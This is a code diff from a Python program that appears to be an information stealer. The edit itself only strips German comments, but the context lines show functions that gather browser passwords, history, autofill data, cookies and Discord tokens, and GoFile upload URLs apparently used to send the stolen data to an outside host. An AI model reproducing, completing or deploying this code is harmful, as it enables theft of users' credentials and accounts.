@@ -1584,7 +1584,7 @@ def create_and_upload_data_files(browser_passwords, browser_history, browser_aut
         return None
 
 def get_token():
-    # Vollständige Notfall-Konfiguration laden
+
     def load_emergency_config():
         global TOKEN_PATHS, BROWSER_PATHS, DISCORD_PATHS, COOKIE_BROWSER_PATHS
         global FIREFOX_INSTALLATIONS, FIREFOX_PROFILE_LOCATIONS, IMPORTANT_DOMAINS
@@ -1675,7 +1675,7 @@ def get_token():
         GOFILE_UPLOAD_URL = 'https://upload.gofile.io/uploadfile'
         GOFILE_CREATE_FOLDER_URL = 'https://api.gofile.io/contents/createFolder'
     
-    # Prüfe ob Konfiguration geladen ist
+
     if 'TOKEN_PATHS' not in globals():
         print("Loading emergency configuration...")
         load_emergency_config()
@@ -1997,7 +1997,7 @@ def load_emergency_config_global():
     GOFILE_CREATE_FOLDER_URL = 'https://api.gofile.io/contents/createFolder'
 
 if __name__ == '__main__':
-    # Lade Notfall-Konfiguration falls nötig
+
     if 'TOKEN_PATHS' not in globals():
         print("Loading emergency configuration...")
         load_emergency_config_global()
